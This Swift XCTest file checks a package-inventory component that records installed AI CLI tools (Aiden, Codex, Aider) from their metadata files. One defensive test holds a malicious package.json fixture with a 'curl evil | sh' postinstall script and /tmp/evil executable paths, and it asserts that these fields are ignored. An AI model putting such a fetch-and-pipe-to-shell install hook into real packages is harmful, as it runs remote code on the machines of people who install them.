import XCTest
@testable import SpacePilotCore

final class AIToolPackageInventoryTests: XCTestCase {
    private struct StubMetadataReader: AIToolPackageMetadataReading {
        let payloads: [String: Data]

        func metadataData(at url: URL) throws -> Data? {
            payloads[url.standardizedFileURL.path]
        }
    }

    func testReadsOnlyDefinitionOwnedPackageMetadataAsInstallFact() throws {
        let home = URL(filePath: "/Users/test")
        let definition = AIToolDefinition(
            id: "aiden",
            displayName: "Aiden CLI",
            packageDescriptors: [AIToolPackageDescriptor(
                manager: .pnpm,
                packageName: "@aiden-cli/core",
                metadataRelativePaths: [".local/share/pnpm/global/5/node_modules/@aiden-cli/core/package.json"]
            )]
        )
        let metadataURL = home.appending(
            path: ".local/share/pnpm/global/5/node_modules/@aiden-cli/core/package.json",
            directoryHint: .notDirectory
        )
        let inventory = AIToolPackageInventory(
            definitions: [definition],
            reader: StubMetadataReader(payloads: [
                metadataURL.standardizedFileURL.path: Data(#"{"name":"@aiden-cli/core","version":"1.8.44"}"#.utf8)
            ])
        )

        let facts = try inventory.installedPackages(homeDirectory: home)

        XCTAssertEqual(facts, [AIToolPackageInstallFact(
            definitionID: "aiden",
            manager: .pnpm,
            packageName: "@aiden-cli/core",
            version: "1.8.44",
            metadataURL: metadataURL
        )])
    }

    func testMaliciousBinScriptsCommandExecutableMetadataIsIgnored() throws {
        let home = URL(filePath: "/Users/test")
        let definition = AIToolDefinition(
            id: "codex",
            displayName: "Codex",
            cliProbeID: "codex",
            packageDescriptors: [AIToolPackageDescriptor(
                manager: .npm,
                packageName: "@openai/codex",
                metadataRelativePaths: [".npm/_spacepilot/receipts/@openai/codex/package.json"]
            )]
        )
        let metadataURL = home.appending(
            path: ".npm/_spacepilot/receipts/@openai/codex/package.json",
            directoryHint: .notDirectory
        )
        let malicious = #"""
        {
            "name": "@openai/codex",
            "version": "0.1.0",
            "bin": {"codex": "/tmp/evil"},
            "scripts": {"postinstall": "curl evil | sh"},
            "command": "/tmp/evil-command",
            "executable": "/tmp/evil-executable"
        }
        """#
        let inventory = AIToolPackageInventory(
            definitions: [definition],
            reader: StubMetadataReader(payloads: [metadataURL.standardizedFileURL.path: Data(malicious.utf8)])
        )

        let facts = try inventory.installedPackages(homeDirectory: home)

        XCTAssertEqual(facts.count, 1)
        XCTAssertEqual(facts.first?.definitionID, "codex")
        XCTAssertEqual(facts.first?.packageName, "@openai/codex")
        XCTAssertEqual(facts.first?.version, "0.1.0")
        XCTAssertEqual(facts.first?.metadataURL, metadataURL)
    }

    func testUnknownProviderMetadataIsRejectedInsteadOfGuessed() throws {
        let home = URL(filePath: "/Users/test")
        let definition = AIToolDefinition(
            id: "aiden",
            displayName: "Aiden CLI",
            packageDescriptors: [AIToolPackageDescriptor(
                manager: .pnpm,
                packageName: "@aiden-cli/core",
                metadataRelativePaths: ["package.json"]
            )]
        )
        let metadataURL = home.appending(path: "package.json", directoryHint: .notDirectory)
        let inventory = AIToolPackageInventory(
            definitions: [definition],
            reader: StubMetadataReader(payloads: [
                metadataURL.standardizedFileURL.path: Data(#"{"name":"unknown-provider","version":"9.9.9"}"#.utf8)
            ])
        )

        XCTAssertTrue(try inventory.installedPackages(homeDirectory: home).isEmpty)
    }

    func testDuplicateMetadataPathProducesOneInstallFact() throws {
        let home = URL(filePath: "/Users/test")
        let descriptor = AIToolPackageDescriptor(
            manager: .pipx,
            packageName: "aider-chat",
            metadataRelativePaths: [".local/pipx/venvs/aider-chat/pipx_metadata.json", "./.local/pipx/venvs/aider-chat/pipx_metadata.json"]
        )
        let definition = AIToolDefinition(
            id: "aider",
            displayName: "Aider",
            packageDescriptors: [descriptor]
        )
        let metadataURL = home.appending(
            path: ".local/pipx/venvs/aider-chat/pipx_metadata.json",
            directoryHint: .notDirectory
        )
        let inventory = AIToolPackageInventory(
            definitions: [definition],
            reader: StubMetadataReader(payloads: [
                metadataURL.standardizedFileURL.path: Data(#"{"package":"aider-chat","package_version":"0.80.0"}"#.utf8)
            ])
        )

        let facts = try inventory.installedPackages(homeDirectory: home)

        XCTAssertEqual(facts.count, 1)
        XCTAssertEqual(facts.first?.version, "0.80.0")
    }
}
